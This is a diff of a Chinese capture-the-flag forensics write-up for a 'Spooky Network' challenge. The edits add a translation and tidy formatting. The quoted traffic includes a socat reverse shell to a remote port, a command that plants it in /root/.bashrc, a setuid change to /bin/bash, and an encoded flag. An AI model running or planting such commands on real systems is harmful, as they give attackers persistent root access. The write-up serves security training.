@@ -2,9 +2,11 @@
 
 :::note CHALLENGE DESCRIPTION
 
-VERY EASY
+Difficulty: VERY EASY
 
 I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong.&quot; Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.
+
+我告诉过他们，现在部署这样一个网站还为时过早，而且季节也不对，但他们向我保证，只要主题设计得当，就能阻止幽灵的侵扰。我错了。现在，`Spooky Network` 内部发生了入侵事件，你需要查明发生了什么。分析网络流量，找出可怕的幽灵是如何入侵的，以及他们做了什么。
 
 :::
 
@@ -23,13 +25,13 @@ Accept: */*
 Connection: keep-alive
 ```
 
-URL Decode得到
+URL Decode 得到
 
 ```plaintext
 socat TCP:192.168.1.180:1337 EXEC:bash
 ```
 
-看起来就是将bash绑定到了`1337`端口，看下一个会话
+看起来就是将 bash 绑定到了 `1337` 端口，看下一个会话
 
 ```plaintext
 id
@@ -71,7 +73,7 @@ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/passwd
 /usr/bin/chsh
 echo 'socat TCP:192.168.1.180:1337 EXEC:sh' > /root/.bashrc && echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev > /dev/null && chmod +s /bin/bash
-ls -lha 
+ls -lha
 total 20K
 drwxr-xr-x 1 root root 4.0K Oct 10 17:28 .
 drwxr-xr-x 1 root root 4.0K Oct 10 17:28 ..
